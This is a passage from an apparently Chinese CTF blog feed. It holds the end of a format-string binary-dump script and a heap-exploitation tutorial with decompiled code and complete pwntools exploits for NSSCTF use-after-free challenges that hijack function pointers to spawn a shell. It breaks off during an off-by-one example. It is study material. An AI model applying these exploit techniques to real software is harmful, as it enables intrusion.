class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = leak(begin)</span><br><span class="line">        begin = begin+<span class="built_in">len</span>(data)</span><br><span class="line">        <span class="built_in">bin</span> +=data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data)==<span class="number">0</span>:</span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            <span class="built_in">bin</span> += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(<span class="built_in">bin</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bin</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里由于偏移是6，所以我们写入的二%7$sdump是在6的位置，那么我们泄露数据的位置自然是在偏移为7处了。这里的dump是为了平衡栈，然后后面就是对数据的接收了。接收完后，我们可以看到一堆二进制乱码。仔细查找，可以看到几个我们能读懂的就是flag了。</p>
<p><img src="/images/week3-5(2).png"></p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>Heap from 0 to 1</title>
    <url>/2026/01/23/Heap-from-0-to-1/</url>
    <content><![CDATA[<h1 id="Heap-from-0-to-1"><a href="#Heap-from-0-to-1" class="headerlink" title="Heap from 0 to 1"></a>Heap from 0 to 1</h1><p>这里会记录从0到1我的pwn堆题记录。记录一些经典例题和各种技巧。文章中出现的任何题目都出自NSS。</p>
<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a><code>UAF</code></h2><h3 id="Use-After-Free：即free后再次进行利用。"><a href="#Use-After-Free：即free后再次进行利用。" class="headerlink" title="Use After Free：即free后再次进行利用。"></a>Use After Free：即free后再次进行利用。</h3><p><code>Dangling Pointer</code>（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。</p>
<h4 id="1-NISACTF-2022-UAF"><a href="#1-NISACTF-2022-UAF" class="headerlink" title="1.[NISACTF 2022]UAF"></a>1.<code>[NISACTF 2022]UAF</code></h4><p>[<a href="https://www.nssctf.cn/problem/2161">NISACTF 2022]UAF | NSSCTF</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v3[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1.create&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3[<span class="number">0</span>] &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      create();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作主要看show函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  <span class="keyword">if</span> ( i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt;= <span class="number">0</span> || i &gt; i )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo((&amp;page)[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*((<span class="type">void</span> (__cdecl **)(<span class="type">char</span> *))page + <span class="number">1</span>))(page);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，当i&#x3D;0的时候会执行else里的语句，即调用我们输入到page里的echo函数。那么也就是说，如果我们将page里echo函数改为system函数的plt表，再输入&#x2F;bin&#x2F;sh就可以成功getsehll了。<br>首先先确定一下echo函数的位置。</p>
<p><img src="/images/heap1.png" alt="gdb"></p>
<p>由于是32位程序，所以我们无法输入&#x2F;bin&#x2F;sh。就可以输入sh。但是sh只占两个字节，所以可以用sh;\x00来截断system的读取。就可以达到system(“sh”)的效果了。</p>
<p>漏洞点在del函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  <span class="keyword">if</span> ( i &lt; <span class="number">0</span> || i &gt; i )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">free</span>((&amp;page)[i]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这里free掉chunk[i]后，并没有给该指针赋值为NULL。所以这里出现了野指针。此时的指针仍然指向我们刚刚删除的chunk。也就是说我们仍然可以非法访问该chunk。所以可以做到改写echo函数为system函数。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,26097)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;page&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;strings&#x27;</span>)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;page&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;page&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">add() <span class="comment">#index 0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add() <span class="comment">#index 1</span></span><br><span class="line">pl = <span class="string">b&#x27;sh;\x00&#x27;</span> + p32(<span class="number">0x80484e0</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">1</span>,pl)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里先是创建了一个chunk，然后释放掉。此时index为0就可以访问到我们刚刚申请的chunk。再次创建一个chunk，index为1。但是1和0所指向的chunk其实是同一个堆块。所以我们可以通过index为1来任意修改该chunk的内容，再通过index为0来调用该堆块。</p>
<h4 id="2-BJDCTF-2020-YDSneedGirlfriend"><a href="#2-BJDCTF-2020-YDSneedGirlfriend" class="headerlink" title="2.[BJDCTF 2020]YDSneedGirlfriend"></a>2.<code>[BJDCTF 2020]YDSneedGirlfriend</code></h4><p>[<a href="https://www.nssctf.cn/problem/712">BJDCTF 2020]YDSneedGirlfriend | NSSCTF</a></p>
<p>这道题和上面还是有点相似性的，不过这个题目名字出的很抽象啊哈哈。</p>
<p>保护情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/nssctf/heap/3/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  myinit();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">      n2 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_girlfriend();                    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n2 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_girlfriend();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n2 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_girlfriend();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和上面一样也是先给一个菜单，分别让我们去创建，删除，输入chunk。</p>
<p>同时在print_girlfriend函数里可以看出，这个函数的作用是将我们输入的内容输出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">print_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  count = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( count &gt;= <span class="number">0</span> &amp;&amp; count &lt; count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;girlfriendlist + count) )</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(_QWORD))*(&amp;girlfriendlist + count))(*(&amp;girlfriendlist + count));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在add_girlfriend函数里可以看出，这里将我们申请的堆块分成了两个。一个是struct chunk，里面放着print_girlfriend函数的指针和我们输入的内容的指针。另一个是content chunk，里面存放着我们写入的内容。也可以从gdb里看出来。</p>
<p><img src="/images/heap2.png" alt="gdb"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> top_chunk_name_size_name; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;girlfriendlist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;girlfriendlist + i) = <span class="built_in">malloc</span>(<span class="number">0x10u</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;girlfriendlist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_QWORD *)*(&amp;girlfriendlist + i) = print_girlfriend_name;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Her name size is :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">        top_chunk_name_size_name = atoi(buf);   <span class="comment">// top chunk</span></span><br><span class="line">                                                <span class="comment">// name size</span></span><br><span class="line">                                                <span class="comment">// name</span></span><br><span class="line">        v0 = (__int64)*(&amp;girlfriendlist + i);</span><br><span class="line">        *(_QWORD *)(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(top_chunk_name_size_name);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)*(&amp;girlfriendlist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Her name is :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;girlfriendlist + i) + <span class="number">1</span>), top_chunk_name_size_name);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !Wow YDS get a girlfriend!&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，如果我们将第一个struct chunk放在指向printf_girlfriend函数的指针修改为指向backdoor函数就可以成功getshell了。</p>
<p>但是我们只能修改content chunk里的内容，又该怎么办呢？</p>
<p>其实很简单。我们只需要申请和struct chunk(0x10)大小不同的chunk就可以了。因为大小不同的chunk是分给不同的bins来管理的。那么当我们申请两次add，再释放掉。再申请一次大小为0x10的content chunk就可以将我们申请的前两次struct chunk分别作为第三次的struct和content chunk了。这样我们就可以通过向content chunk写入内容将print改写为backdoor，再通过print来getshell了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">27899</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size is :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;name is :&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">backdoor  = <span class="number">0x400b9c</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaaaa&#x27;</span>) <span class="comment">#idx 0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;cccccc&#x27;</span>) <span class="comment">#idx 1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题关键是要弄清楚各个堆块内存的管理。也是UAF的手法。</p>
<h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a><code>off-by-one</code></h2><p>off-by-one是指<code>单字节缓冲区溢出</code>其实不仅在堆里出现，在栈上也是一种可以利用的漏洞。不过在这里就仅仅考虑在堆上的利用。</p>
<h4 id="1-HNCTF-2022-WEEK4-EZheap"><a href="#1-HNCTF-2022-WEEK4-EZheap" class="headerlink" title="1.[HNCTF 2022 WEEK4] EZheap"></a><code>1.[HNCTF 2022 WEEK4] EZheap</code></h4><p>[<a href="https://www.nssctf.cn/problem/3104">HNCTF 2022 WEEK4]ezheap | NSSCTF</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init_env(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy Note.&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      n4 = getnum();</span><br><span class="line">      <span class="keyword">if</span> ( n4 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n4 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( n4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是很熟悉的菜单。不过此时这里的delete函数是无法利用的。也就是在这里将free掉的堆块都赋0了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_QWORD *<span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *heaplist; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt;= <span class="number">0x10</span> &amp;&amp; *(_DWORD *)(heaplist[n0x10] + <span class="number">24LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(heaplist[n0x10] + <span class="number">16LL</span>));</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)heaplist[n0x10]);</span><br><span class="line">    sizelist[n0x10] = <span class="number">0LL</span>;</span><br><span class="line">    *(_DWORD *)(heaplist[n0x10] + <span class="number">24LL</span>) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)(heaplist[n0x10] + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    heaplist = heaplist;</span><br><span class="line">    heaplist[n0x10] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> heaplist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面给出的是add()函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  v3 = getnum();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &gt; <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    heaplist[v3] = <span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !heaplist[v3] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span 